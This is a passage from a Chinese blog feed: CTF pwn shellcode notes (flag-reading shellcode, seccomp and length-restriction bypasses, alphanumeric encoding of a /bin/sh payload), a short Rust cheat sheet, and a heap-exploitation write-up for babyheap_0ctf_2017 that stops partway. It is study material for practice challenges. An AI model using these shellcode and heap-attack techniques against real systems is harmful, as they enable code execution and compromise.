<li><p><a href="https://shell-storm.org/shellcode/index.html">Shellcodes
database for study cases(已停止更新)</a></p>
<ul>
<li>这个虽然停更了但是挺好用的，很适合找一些 length restrictions 的
shellcode</li>
</ul></li>
</ol>
<h2 id="现有工具">[1-2] 现有工具</h2>
<h3 id="pwntools">[1-2-1] Pwntools</h3>
<h4 id="shellcraft">[1-2-1-1] shellcraft</h4>
<ul>
<li><p><a
href="https://docs.pwntools.com/en/stable/shellcraft.html">Manual</a></p></li>
<li><p>速成 (更多请 RTFM 或查看 [1-3] ) <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># arch: i386 / amd64</span></span><br><span class="line"><span class="comment"># os: linux</span></span><br><span class="line"><span class="comment"># func: open / read / write / mmap</span></span><br><span class="line">shellcode = shellcraft.arch.os.func(args)</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h4 id="asm">[1-2-1-2] asm</h4>
<ul>
<li>定义: <code>def asm(str) -&gt; bytes</code></li>
</ul>
<h2 id="板子">[1-3] 板子</h2>
<ol type="1">
<li><p>常用 shellcraft</p>
<p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(&#x27;./flag&#x27;)</span></span><br><span class="line">shellcode_open = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd,addr,nbytes)</span></span><br><span class="line">shellcode_read = shellcraft.read(<span class="number">0</span>,<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment"># 其他用法: shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,0x100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write(fd,addr,nbytes)</span></span><br><span class="line">shellcode_read = shellcraft.write(<span class="number">1</span>,<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mmap(addr,len,prot,flags,fd,offset)</span></span><br><span class="line">shellcode_mmap = shellcraft.mmap(<span class="number">0xBABECAFE</span>,<span class="number">0x80</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>不用堆栈的 <code>orw</code>，字符串"flag"需要提前布置好.
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0x2333008     # 指向&quot;flag\x00\x00\x00\x00&quot;的指针</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall               # open(&#x27;./flag&#x27;)</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov rdi,3             # fd = 3</span></span><br><span class="line"><span class="string">mov rdx,0x50          # nbytes = 0x50</span></span><br><span class="line"><span class="string">mov esi,0x2333100     # address = 0x2333100</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall               # read(3,0x2333100,0x50)</span></span><br><span class="line"><span class="string">mov rdi,1             # stdin = 1</span></span><br><span class="line"><span class="string">mov rdx,0x50          # nbytes = 0x50</span></span><br><span class="line"><span class="string">mov esi,0x2333100     # address = 0x2333100</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall               # write(1,0x2333100,0x50)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<h2 id="在线网站">[1-4] 在线网站</h2>
<ol type="1">
<li><p><a href="defuse.ca">Online x86 and x64 Intel Instruction
Assembler</a>: 在线编写 shellcode 和反汇编 shellcode，目前只支持
x86/x64</p></li>
<li><p><a href="shell-storm.org">Online Assembler and Disassembler</a>:
另一个更全的在线编写 shellcode 和反汇编 shellcode 网站</p></li>
<li><p><a href="shell-storm.org">Shellcodes database for study
cases</a>: shellcode 数据库，支持很多指令集与操作系统</p></li>
<li><p><a href="exploit-db.com">Exploit Database Shellcodes</a>: 另一个
shellcode 数据库</p></li>
<li><p><a href="revshells.com">Online - Reverse Shell Generator</a>:
生成反弹 shell 的命令</p></li>
</ol>
<h2 id="手搓-shellcode">[1-5] 手搓 shellcode</h2>
<p>传参顺序: rdi,rsi,rdx,rcx,r8,r9</p>
<p>存<a
href="https://blog.csdn.net/qq_29343201/article/details/52209588">系统调用号</a>的寄存器:
rax</p>
<h2 id="c-代码提取-shellcode">[1-6] C 代码提取 shellcode</h2>
<p><a href="https://www.jianshu.com/p/5d1b1eafca21">看这篇</a></p>
<h1 id="shellcode-restrictions-bypass-限制与绕过">[2] shellcode
restrictions &amp; bypass (限制与绕过)</h1>
<h2 id="length-restrictions-长度约束">[2-1] Length restrictions
(长度约束)</h2>
<h3 id="restriction">[2-1-1] restriction</h3>
<p>shellcode 限制在 xx bytes 以内</p>
<h3 id="bypass1---压缩-shellcode">[2-1-2] bypass1 - 压缩 shellcode</h3>
<ol start="0" type="1">
<li><p>构造一次 SYS_read 再去读一遍 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xchg rdi,rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b&#x27;\xeb\xf6&#x27;</span></span><br></pre></td></tr></table></figure> 上述 shellcode 只有
0x10 大小，</p></li>
<li><p>可以去 <a
href="https://shell-storm.org/shellcode/index.html">Shellcodes database
for study cases(已停止更新)</a> 找比较小的 shellcode</p></li>
<li><p>常用压缩方式</p>
<ol type="1">
<li><p>⚠ 观察 <code>寄存器 + 栈</code> 的状态</p></li>
<li><p>长寄存器改为短寄存器 <code>rax(8bytes)</code> -&gt;
<code>eax(4bytes)</code> -&gt; <code>ax(2bytes)</code> -&gt;
<code>ah/al(1byte)</code></p></li>
<li><p>置零</p>
<ol type="1">
<li><p><code>mov reg, 0</code> -&gt; <code>xor reg, reg</code></p></li>
<li><p>多用 <code>push / pop</code></p></li>
<li><p>多用 <code>cdq</code> 来将 <code>rdx</code> 置零</p></li>
<li><p>多用 <code>xchg</code> 交换 <code>reg1</code> 和
<code>reg2</code></p>
<ul>
<li>观察执行 shellcode 时的
context（上下文），用上下文的一些寄存器来初始化</li>
</ul></li>
</ol></li>
</ol></li>
<li><p>没什么用的积累 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov edx,7   ---&gt;   cdq; mov dl,7</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h3 id="bypass2---二次-read">[2-1-3] bypass2 - 二次 read</h3>
<h2 id="seccomp-禁用">[2-2] seccomp 禁用</h2>
<h3 id="restriction-1">[2-2-1] restriction</h3>
<p>程序调用 <code>seccomp</code> 或 <code>prctl</code>
禁用了某些系统调用</p>
<blockquote>
<p>本质是沙盒逃逸，后续打算这里只留下常用的汇编语句或者shellcraft语法，原理挪到
<a href="">Pwn - Sandbox Escape Summary</a> 中去</p>
</blockquote>
<h3 id="bypass">[2-2-2] bypass</h3>
<blockquote>
<p>本质是对 IO stream
的汇编考察，学习这一部分应当积累足够多的相关知识。</p>
</blockquote>
<p><a
href="https://blog.csdn.net/qq_54218833/article/details/134205383">顶级
seccomp 文章</a></p>
<h4 id="open">open</h4>
<h4 id="read">read</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPT 有关 read 的拓展</span><br><span class="line"></span><br><span class="line">如果 `read`、`pread64` 和 `readv` 等系统调用被禁用了，你可能可以考虑使用其他的系统调用来读取文件。以下是一些可能的替代方案：</span><br><span class="line"></span><br><span class="line">1. **mmap**: 使用 `mmap` 系统调用映射文件到内存中，然后通过内存访问来读取文件内容。</span><br><span class="line"></span><br><span class="line">2. **open + read**: 可以使用 `open` 系统调用打开文件，然后使用 `read` 或者 `pread64` 等系统调用来读取文件内容。</span><br><span class="line"></span><br><span class="line">3. **fopen + fread**: 使用标准 C 库函数 `fopen` 和 `fread` 来打开和读取文件内容。</span><br><span class="line"></span><br><span class="line">4. **openat + read**: 使用 `openat` 系统调用打开文件，然后使用 `read` 或者 `pread64` 等系统调用来读取文件内容。</span><br><span class="line"></span><br><span class="line">5. **pipe + fork + exec**: 创建一个管道，在子进程中执行命令来读取文件内容，父进程通过管道读取子进程的输出。</span><br><span class="line"></span><br><span class="line">6. **recv + recvfrom**: 如果你可以通过网络传输文件，你可以使用 `recv` 或 `recvfrom` 等网络套接字函数来接收文件数据。</span><br><span class="line"></span><br><span class="line">7. **其他文件操作函数**: 还有一些其他的文件操作函数，比如 `lseek` 可以用于移动文件指针，`preadv` 可以用于原子地读取多个文件描述符指定的文件内容等。</span><br><span class="line"></span><br><span class="line">要选择合适的替代方案，需要考虑到具体的情况和环境限制。</span><br></pre></td></tr></table></figure>
<h4 id="write">write</h4>
<h4 id="废弃待整理">废弃，待整理</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 `seccomp-tools dump ./pwn` 来查看 elf 文件被禁用了哪些调用</span><br><span class="line"></span><br><span class="line">#### [2-2-2-1] 禁用 `execve`</span><br><span class="line"></span><br><span class="line">- bypass: orw</span><br><span class="line"></span><br><span class="line">#### [2-2-2-2] OR 没有 W ( prctl 禁用 `open` 但不禁用 `fstat`)</span><br><span class="line"></span><br><span class="line">&gt; 注：由于下面的绕过方式需要在64位与32位之间切换，所以建议不要在 exp 开头设置 `context(arch=&#x27;i386/amd64&#x27;)` ，而是选择 `asm(shellcode,arch=&#x27;i386/amd64&#x27;)`</span><br><span class="line"></span><br><span class="line">- bypass: 由于64位下 `fstat` 函数的调用号为 5，而在32位中 `open` 的系统调用号为 5，所以我们可以利用 `retfq` 切换到 32 位执行 `open`</span><br></pre></td></tr></table></figure>
<h2 id="alphanumeric-shellcode-字母数字构成">[2-3] alphanumeric
shellcode (字母+数字构成)</h2>
<h3 id="manual-1">[2-3-1] Manual</h3>
<p><a href="https://nets.ec/Ascii_shellcode">ascii -&gt; asm
手册</a></p>
<h3 id="restriction-2">[2-3-2] restriction</h3>
<p>shellcode 只能由字母和数字组成</p>
<h3 id="shellcode-生成">[2-3-3] shellcode 生成:</h3>
<p>这种 shellcode 可以由工具 <a
href="https://github.com/SkyLined/alpha3">ALPHA3</a> 直接生成，</p>
<p>但 alpha3 的 build 有点儿麻烦，不如直接用杭电一位师傅写的 <a
href="https://github.com/veritas501/ae64">AE64</a>，</p>
<p>AE64 可以将任何 <code>AMD64</code> 架构的 shellcode 转换为
alphanumeric shellcode</p>
<h3 id="示例">[2-3-4] 示例：</h3>
<blockquote>
<p>AE64 在 github 的 README 有更详细的介绍</p>
</blockquote>
<p>简单示例 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get bytes format shellcode</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment"># get alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="built_in">print</span>(enc_shellcode.decode(<span class="string">&#x27;latin-1&#x27;</span>))</span><br></pre></td></tr></table></figure></p>
<p>进阶选项 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">enc_shellcode = AE64().encode(shellcode)</span><br><span class="line"><span class="comment"># equal to </span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode, <span class="string">&#x27;rax&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;fast&#x27;</span>)</span><br><span class="line"><span class="comment"># And we can use &#x27;small&#x27; strategy to generate smaller alphanumeric shellcode</span></span><br><span class="line">enc_shellcode = AE64().encode(shellcode, <span class="string">&#x27;rax&#x27;</span>, <span class="number">0</span>, <span class="string">&#x27;small&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<h1 id="例题">[3] 例题</h1>
<ol type="1">
<li><p><a href="">hgame2024 Week1 ezshellcode</a></p></li>
<li><p><a href="">hgame2024 week2 ShellcodeMaster</a></p></li>
</ol>
<h1 id="参考资料">[4] 参考资料</h1>
<p><a href="https://mp.weixin.qq.com/s/onpGzz2uzSYKf09yvgb3uA">⭐ The
art of shellcode</a></p>
<p><a
href="https://www.freebuf.com/articles/system/237300.html">简单获取shellcode的几种方式</a></p>
<p><a
href="https://pullp.github.io/tips/2021/01/30/shellcode-tips.html">wxk1997's
blog - shellcode tips</a></p>
<p><a
href="https://hkhanbing.github.io/2023/09/25/brics-ctf-pwn-paint%E9%A2%98%E8%A7%A3/">hkbin's
blog - shellcode</a></p>
<p><a href="https://www.anquanke.com/post/id/219077">关于 seccomp
绕过的更深方法</a></p>
<p><a
href="https://blog.csdn.net/qq_54218833/article/details/134205383">顶级
seccomp 文章</a></p>
<p><a href="https://www.nssctf.cn/note/set/1876">Bsahfuck:
限制只允许几种字符的shellcode</a></p>
<p><a
href="https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCqbulD9iiABoD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">shellcode
的艺术 - by n0va</a></p>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>Rust - learning cheat sheet</title>
    <url>/posts/24986.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
DIVE INTO RUST LAKE
</blockquote>
<span id="more"></span>
<h1 id="前言">[0] 前言</h1>
<h1 id="数据类型">[1] 数据类型</h1>
<p>Rust
的数值类型和运算跟其他语言较为相似，但是实际上，除了语法上的不同之外，还是存在一些差异点：</p>
<ol type="1">
<li><p>Rust 拥有相当多的数值类型.
因此你需要熟悉这些类型所占用的字节数，这样就知道该类型允许的大小范围以及你选择的类型是否能表达负数</p></li>
<li><p>类型转换必须是显式的. Rust 永远也不会偷偷把你的 16bit 整数转换成
32bit 整数</p></li>
<li><p>Rust 的数值上可以使用方法. 例如你可以用以下方法来将 13.14
取整：13.14_f32.round()，在这里我们使用了类型后缀，因为编译器需要知道
13.14 的具体类型</p></li>
</ol>
<h2 id="整数类型">[1-1] 整数类型</h2>
<p>与 C++ 几乎没有差别，只是溢出在 debug 模式下会默认抛出错误，在
release
模式下会默认正常。开发者可以通过标准库里的一些函数来强制定义函数行为，具体请见[0xFF]部分的“处理溢出”</p>
<h2 id="浮点数">[1-2] 浮点数</h2>
<p>浮点数会有精度损失的问题，因此避免在浮点数上测试相等性，如果非要比较也请用容忍误差的不等式来处理；当结果在数学上可能存在UB的时候，也要防御性编程，Rust
将未定义的数学表达式的返回值设置成 NaN</p>
<h2 id="字符单元">[1-3] 字符、单元</h2>
<p>Unicode 字符，占4字节</p>
<p>()被称为单元类型，唯一的值也是(). 比如 main() 函数返回的就是 ()
这个值. () 可以作为一个值用来占位，但是完全不占用任何内存。</p>
<h2 id="类型转换有理数与复数">[1-4] 类型转换、有理数与复数</h2>
<p>请见<a
href="https://course.rs/basic/base-type/numbers.html#%E4%BD%BF%E7%94%A8-as-%E5%AE%8C%E6%88%90%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">Rust
语言圣经相关内容</a></p>
<h2 id="语句表达式与函数">[1-5] 语句、表达式与函数</h2>
<p>目前可以理解为，语句没有返回值而表达式有返回值。函数如果没有显式定义返回值的话，默认返回单元类型（也就是说
fn main() {} 与 fn main() -&gt; () {} 是等价的）。</p>
<p>常见的语句有：let</p>
<p>常见的表达式有：if-else结构</p>
<p>至于函数，需要注意的点是：①函数可以在任意位置声明，不需要在使用的代码上面声明
②函数是一个表达式 ③发散函数，用到的时候点<a
href="https://course.rs/basic/base-type/function.html#%E6%B0%B8%E4%B8%8D%E8%BF%94%E5%9B%9E%E7%9A%84%E5%8F%91%E6%95%A3%E5%87%BD%E6%95%B0-">这里</a></p>
<h1 id="格式化输出">[2] 格式化输出</h1>
<h2 id="println-宏">[2-1] println! 宏</h2>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:.2&#125;&quot;</span>, x);  <span class="comment">// 控制小数位为2位</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:08b&#125;&quot;</span>, x); <span class="comment">// 左高右低输出二进制01，不足8位高位补0 </span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:.2&#125;&quot;</span>, x);  <span class="comment">// </span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:.2&#125;&quot;</span>, x);  <span class="comment">// </span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:.2&#125;&quot;</span>, x);  <span class="comment">// </span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:.2&#125;&quot;</span>, x);  <span class="comment">// </span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:.2&#125;&quot;</span>, x);  <span class="comment">// </span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:.2&#125;&quot;</span>, x);  <span class="comment">// </span></span><br></pre></td></tr></table></figure>
<h1 id="所有权">[3] 所有权</h1>
<h2 id="变量的绑定与解构">[3-1] 变量的绑定与解构</h2>
<p>let, let mut, let (mut a, b) = (1, 2), let [c, .., d, _] = [1, 2, 3,
4, 5], let e; Struct {e, ..} = Struct {e: 5};</p>
<h2 id="所有权-1">[3-2] 所有权</h2>
<h1 id="xff-rust-的标准库">[0xFF] Rust 的标准库</h1>
<h2 id="f-0-常见与未分类">[F-0] 常见与未分类</h2>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">std::mem::<span class="title function_ invoke__">size_of_val</span>(&amp;x) <span class="comment">// 某个数据类型的大小</span></span><br></pre></td></tr></table></figure>
<h2 id="f-1-处理溢出">[F-1] 处理溢出</h2>
<p>使用 wrapping_* 方法在所有模式下都按照补码循环溢出规则处理，例如
wrapping_add</p>
<p>如果使用 checked_* 方法时发生溢出，则返回 None 值</p>
<p>使用 overflowing_* 方法返回该值和一个指示是否存在溢出的布尔值</p>
<p>使用 saturating_*
方法，可以限定计算后的结果不超过目标类型的最大值或低于最小值，例如:</p>
<h2 id="f-2">[F-2]</h2>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Practice1</title>
    <url>/posts/31252.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
练习题 wp 记录
</blockquote>
<span id="more"></span>
<h1 id="目录">目录</h1>
<ul>
<li><a href="#0x00-tools-in-pwn">Tools in pwn</a></li>
<li><a href="#0x01-buuctf-babyheap_0ctf_2017">buuctf
babyheap_0ctf_2017</a></li>
<li><a href="#0x02-buuctf-ogeek2019babyrop_wp">buuctf
ogeek2019babyrop_wp</a></li>
<li><a href="#0x03-buuctf-hitcontraining_bamboobox">buuctf
hitcontraining_bamboobox</a></li>
<li><a href="#0x04-hitcontraining_uaf">buuctf
hitcontraining_uaf</a></li>
<li><a href="#0x05-hitcontraining_magicheap">buuctf
hitcontraining_magicheap</a></li>
<li><a href="#0x06-ciscn_2019_n_3">buuctf ciscn_2019_n_3</a></li>
<li><a href="#0x07-babyfengshui_33c3_2016">buuctf
babyfengshui_33c3_2016</a></li>
<li><a href="#0x08-hitcontraining_heapcreator">buuctf
hitcontraining_heapcreator</a></li>
<li><a href="#0x09-hitcon2014_stkof">buuctf hitcon2014_stkof</a></li>
<li><a href="#0x0a-jarvisoj_level5">buuctf jarvisoj_level5</a></li>
<li><a href="#0x0b-ciscn_2019_es_7">buuctf ciscn_2019_es_7</a></li>
</ul>
<h1 id="x00-tools-in-pwn">0x00 Tools in Pwn</h1>
<h2 id="pwndbg">pwndbg</h2>
<ol type="1">
<li><p>gdb.attach(io,'xxx')</p>
<ol type="1">
<li>xxx 为 GDB 的调试语句，比如'b main' 或者 'n 285'</li>
</ol></li>
</ol>
<h2 id="gadgets">gadgets</h2>
<h3 id="ropgadget">ROPgadget</h3>
<ol type="1">
<li><p>面向 elf 文件使用，详情RTFM<code>ROPgadget -h</code></p></li>
<li><p>命令省流</p>
<ol type="1">
<li><p><code>ROPgadget --binary ./pwn --only "pop|ret" | grep rdi</code></p></li>
<li><p><code>ROPgadget --binary ./pwn --string 'sh'</code></p></li>
</ol></li>
</ol>
<h3 id="one_gadget">one_gadget</h3>
<ol type="1">
<li><p>面向 libc 库使用</p></li>
<li><p>命令 <code>one_gadget ./libc.so.6</code></p></li>
</ol>
<h2 id="seccomp-tools">seccomp-tools</h2>
<ol type="1">
<li><p>面向 elf 文件使用</p></li>
<li><p>命令 <code>seccomp-tools dump ./pwn</code></p></li>
</ol>
<blockquote class="blockquote-center">
第一道Heap，插个里程碑纪念一下XD
</blockquote>
<h1 id="x01-buuctf-babyheap_0ctf_2017">0x01 BUUCTF
babyheap_0ctf_2017</h1>
<h2 id="写在前面">0. 写在前面</h2>
<p>七月学完栈溢出，ak掉buu前两页的所有栈题<br />
八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br />
参加了个数据安全的夏令营<br />
给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br />
给SecretFlow审了一点go语言的洞<br />
然后用C#和xaml给sdu校园网写了个一键修复脚本<br />
总而言之学的很杂...说实话真不如多打点比赛。<br />
本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了...<br />
总而言之还是脚踏实地学一点算一点吧<br />
还有个南大PA的坑等着我去填呢...才刚把nemu的gdb实现了个单步步入...</p>
<blockquote>
<p>做完这道题才算真正意义上的AK第一页XD</p>
</blockquote>
<h2 id="主要知识点">Ⅰ. 主要知识点</h2>
<ol type="1">
<li>堆溢出</li>
</ol>
<h2 id="解题步骤">Ⅱ. 解题步骤</h2>
<ol type="1">
<li>checksec 保护全开</li>
</ol>
<p><img src="/pic/Pasted%20image%2020230814133847.png" /></p>
<ol start="2" type="1">
<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下<br />
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure></p></li>
<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br />
<img src="/pic/Pasted%20image%2020230814134313.png" /> <img
src="/pic/Pasted%20image%2020230814134623.png" />
注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p></li>
<li><p>IDA分析可知，我们可以有以下思路：</p>
<ol type="1">
<li>Fill函数的输入字符数量是受我们控制的，所以可以堆溢出；</li>
<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址
<ol type="1">
<li>要泄露libc地址，肯定要读存有libc地址的地址
<ol type="1">
<li>哪里存着libc地址？unsorted
bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
<li>怎么去读unsorted bin的fd/bk指针？堆溢出+多次free/alloc</li>
</ol></li>
</ol></li>
<li>有了libc地址，我们可以通过修改fastbin的fd指针，在程序的__malloc_hook处(用libc+偏移来计算)申请一个我们可以操控的堆块，并在其中写入og的地址来提权</li>
</ol></li>
<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted
bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin
chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#index = 3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#index = 4</span></span><br></pre></td></tr></table></figure> 此时堆的情况如下 <img
src="/pic/Pasted%20image%2020230814140742.png" /></p></li>
<li><p>Free掉index为1和2的chunk，给后面alloc留出空间 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
heap情况如下 <img src="/pic/Pasted%20image%2020230814141436.png" />
bin情况如下 <img
src="/pic/Pasted%20image%2020230814141724.png" /></p></li>
<li><p>堆溢出，操控fastbin</p>
<ol type="1">
<li>现在是main_arena_fastbin_0x20 ---&gt; chunk2 ---&gt;chunk1</li>
<li>我们想办法让它变成 xxx_0x20 ---&gt; chunk2 ---&gt;chunk4
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
（这里读者可以自己gdb.attach用bin命令去查看fastbin前后的状态）</li>
</ol></li>
<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br></pre></td></tr></table></figure></p></li>
<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure> heap情况如下 <img
src="/pic/Pasted%20image%2020230814143302.png" /></p></li>
<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来。这个地址是main_arena+88，打开libc可以看到main_arena的地址为0x3c4b20，所以我们获得的libc_addr需要减88再减0x3c4b20，即减去0x3C4B78
<img src="/pic/Pasted%20image%2020230814144704.png" />
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base   ---&gt;   &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure></p></li>
<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来在malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方
<img src="/pic/Pasted%20image%2020230814145721.png" />
发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请<br />
⚠这里图aed写错了，而且不应该看这个界面，整体上的chunk应该是
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 将unsortedbin中的chunk4切0x60大小申请出来</span></span><br><span class="line">free(<span class="number">4</span>)                                        <span class="comment"># 把chunk4放到fastbin中，便于用pointer_chunk2操控</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)              <span class="comment"># 把申请块写进malloc_hook前面</span></span><br><span class="line">fill(<span class="number">2</span>,payload)                                <span class="comment"># 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span></span><br><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 把chunk4申请回来</span></span><br><span class="line">alloc(<span class="number">0x60</span>)                                    <span class="comment"># 在malloc_hook处构造堆，index=6</span></span><br></pre></td></tr></table></figure>
<ol start="13" type="1">
